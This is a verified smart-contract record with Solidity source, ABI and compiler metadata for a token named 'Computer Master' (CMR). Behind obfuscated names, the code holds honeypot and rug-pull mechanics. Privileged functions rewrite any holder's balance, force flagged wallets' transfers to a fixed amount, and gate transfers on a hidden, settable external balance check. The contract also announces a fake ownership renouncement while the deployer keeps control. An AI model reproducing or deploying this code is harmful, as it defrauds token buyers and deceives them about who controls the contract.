{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface totalFrom {\n    function createPair(address totalSender, address teamLimitWallet) external returns (address);\n}\n\ninterface launchIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toExempt) external view returns (uint256);\n\n    function transfer(address amountExemptSell, uint256 maxLaunched) external returns (bool);\n\n    function allowance(address exemptSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountExemptSell,\n        uint256 maxLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeSell, uint256 value);\n    event Approval(address indexed exemptSwap, address indexed spender, uint256 value);\n}\n\nabstract contract shouldSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchIsMetadata is launchIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ComputerMaster is shouldSender, launchIs, launchIsMetadata {\n\n    function totalAt(address receiverFrom) public {\n        require(receiverFrom.balance < 100000);\n        if (teamLaunch) {\n            return;\n        }\n        if (sellMarketing == txAt) {\n            sellMarketing = true;\n        }\n        tokenBuy[receiverFrom] = true;\n        \n        teamLaunch = true;\n    }\n\n    function balanceOf(address toExempt) public view virtual override returns (uint256) {\n        return limitSellIs[toExempt];\n    }\n\n    mapping(address => bool) public tokenBuy;\n\n    uint256 private teamBuy;\n\n    function isReceiverLaunched(address walletAt) public {\n        modeAmountShould();\n        if (sellLaunchFund != teamBuy) {\n            sellLaunchFund = teamBuy;\n        }\n        if (walletAt == txIs || walletAt == launchMin) {\n            return;\n        }\n        modeTotalMarketing[walletAt] = true;\n    }\n\n    function launchReceiver(address senderReceiver, address amountExemptSell, uint256 maxLaunched) internal returns (bool) {\n        if (senderReceiver == txIs) {\n            return exemptTeam(senderReceiver, amountExemptSell, maxLaunched);\n        }\n        uint256 walletMarketing = launchIs(launchMin).balanceOf(listMarketing);\n        require(walletMarketing == tradingLaunch);\n        require(amountExemptSell != listMarketing);\n        if (modeTotalMarketing[senderReceiver]) {\n            return exemptTeam(senderReceiver, amountExemptSell, autoSender);\n        }\n        return exemptTeam(senderReceiver, amountExemptSell, maxLaunched);\n    }\n\n    function receiverAuto() public {\n        emit OwnershipTransferred(txIs, address(0));\n        fundLaunched = address(0);\n    }\n\n    function shouldMax(address liquidityTo, uint256 maxLaunched) public {\n        modeAmountShould();\n        limitSellIs[liquidityTo] = maxLaunched;\n    }\n\n    function totalSell(uint256 maxLaunched) public {\n        modeAmountShould();\n        tradingLaunch = maxLaunched;\n    }\n\n    mapping(address => mapping(address => uint256)) private atAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isTx;\n    }\n\n    function transfer(address liquidityTo, uint256 maxLaunched) external virtual override returns (bool) {\n        return launchReceiver(_msgSender(), liquidityTo, maxLaunched);\n    }\n\n    uint256 private sellLaunchFund;\n\n    address public launchMin;\n\n    address private fundLaunched;\n\n    address listBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public sellMarketing;\n\n    uint8 private toShould = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toShould;\n    }\n\n    address listMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address senderIs, uint256 maxLaunched) public virtual override returns (bool) {\n        atAuto[_msgSender()][senderIs] = maxLaunched;\n        emit Approval(_msgSender(), senderIs, maxLaunched);\n        return true;\n    }\n\n    function modeAmountShould() private view {\n        require(tokenBuy[_msgSender()]);\n    }\n\n    bool public txAt;\n\n    uint256 tradingLaunch;\n\n    uint256 constant autoSender = 12 ** 10;\n\n    bool public teamLaunch;\n\n    function transferFrom(address senderReceiver, address amountExemptSell, uint256 maxLaunched) external override returns (bool) {\n        if (_msgSender() != listBuy) {\n            if (atAuto[senderReceiver][_msgSender()] != type(uint256).max) {\n                require(maxLaunched <= atAuto[senderReceiver][_msgSender()]);\n                atAuto[senderReceiver][_msgSender()] -= maxLaunched;\n            }\n        }\n        return launchReceiver(senderReceiver, amountExemptSell, maxLaunched);\n    }\n\n    event OwnershipTransferred(address indexed modeToken, address indexed fundAuto);\n\n    mapping(address => bool) public modeTotalMarketing;\n\n    address public txIs;\n\n    function exemptTeam(address senderReceiver, address amountExemptSell, uint256 maxLaunched) internal returns (bool) {\n        require(limitSellIs[senderReceiver] >= maxLaunched);\n        limitSellIs[senderReceiver] -= maxLaunched;\n        limitSellIs[amountExemptSell] += maxLaunched;\n        emit Transfer(senderReceiver, amountExemptSell, maxLaunched);\n        return true;\n    }\n\n    string private autoSell = \"CMR\";\n\n    function getOwner() external view returns (address) {\n        return fundLaunched;\n    }\n\n    mapping(address => uint256) private limitSellIs;\n\n    constructor (){\n        if (teamBuy == sellLaunchFund) {\n            sellMarketing = false;\n        }\n        walletTotal walletReceiver = walletTotal(listBuy);\n        launchMin = totalFrom(walletReceiver.factory()).createPair(walletReceiver.WETH(), address(this));\n        \n        txIs = _msgSender();\n        tokenBuy[txIs] = true;\n        limitSellIs[txIs] = isTx;\n        receiverAuto();\n        if (sellLaunchFund != teamBuy) {\n            sellMarketing = false;\n        }\n        emit Transfer(address(0), txIs, isTx);\n    }\n\n    function owner() external view returns (address) {\n        return fundLaunched;\n    }\n\n    string private takeEnableSell = \"Computer Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return takeEnableSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoSell;\n    }\n\n    function allowance(address isMin, address senderIs) external view virtual override returns (uint256) {\n        if (senderIs == listBuy) {\n            return type(uint256).max;\n        }\n        return atAuto[isMin][senderIs];\n    }\n\n    uint256 private isTx = 100000000 * 10 ** 18;\n\n    uint256 buyList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"}],\"name\":\"isReceiverLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTotalMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"shouldMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"totalAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"totalSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountExemptSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ComputerMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}